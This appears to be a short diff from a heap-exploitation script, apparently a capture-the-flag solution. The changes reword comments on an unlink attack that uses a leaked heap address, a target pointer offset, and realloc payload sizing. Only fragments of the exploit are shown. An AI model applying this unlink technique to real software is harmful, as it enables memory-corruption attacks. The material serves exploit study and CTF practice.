@@ -168,7 +168,7 @@ if __name__ == "__main__":
     # FD->bk == P && BK->fd == P
     # 
 
-    target = leaked_heap - 6128 # target is the pointer to chunk 0
+    target = leaked_heap - 6128 # target is note0->ptr
 
     log.info('target address: 0x%x' % target)
     log.info('chunk_0: 0x%x' % leaked_heap)
@@ -201,7 +201,7 @@ if __name__ == "__main__":
 
     # delete_note(1) makes target points to itself (to be precise, -24 bytes)
     #
-    # since, chunk0->ptr points &chunk->ptr-24, we need to prefix (3-qword)
+    # since, note0->ptr points &note0->ptr-24, we need to prefix (3-qword)
     # entire payload size should be same, or realloc() will break the entire exploit sequence apart
     #
     # [COUNT 1] [OCCUPIED YES] [NOTE SIZE 8] [PTR to CHUNK]
